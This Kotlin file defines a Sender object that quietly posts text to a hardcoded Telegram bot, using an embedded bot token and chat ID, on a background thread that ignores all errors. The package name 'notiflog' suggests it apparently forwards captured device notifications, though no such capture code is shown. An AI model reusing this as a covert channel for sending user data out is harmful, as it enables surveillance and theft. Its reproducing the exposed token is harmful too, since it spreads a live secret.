package com.notiflog

import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

object Sender {

    private const val TOKEN = "9034601463:AAGJLInaPQFaUQ22x-c2y0f9zLfDdTNgkxE"
    private const val CHAT_ID = "190382420"

    fun send(text: String) {
        if (TOKEN.startsWith("PASTE")) return
        Thread {
            try {
                val conn = URL("https://api.telegram.org/bot$TOKEN/sendMessage")
                    .openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.connectTimeout = 20000
                conn.readTimeout = 20000
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")

                val body = buildString {
                    append("chat_id=").append(URLEncoder.encode(CHAT_ID, "UTF-8"))
                    append("&disable_web_page_preview=true")
                    append("&text=").append(URLEncoder.encode(text, "UTF-8"))
                }

                OutputStreamWriter(conn.outputStream, "UTF-8").use { it.write(body) }
                conn.responseCode
                runCatching { conn.inputStream?.close() }
                conn.disconnect()
            } catch (_: Exception) {
            }
        }.start()
    }
}
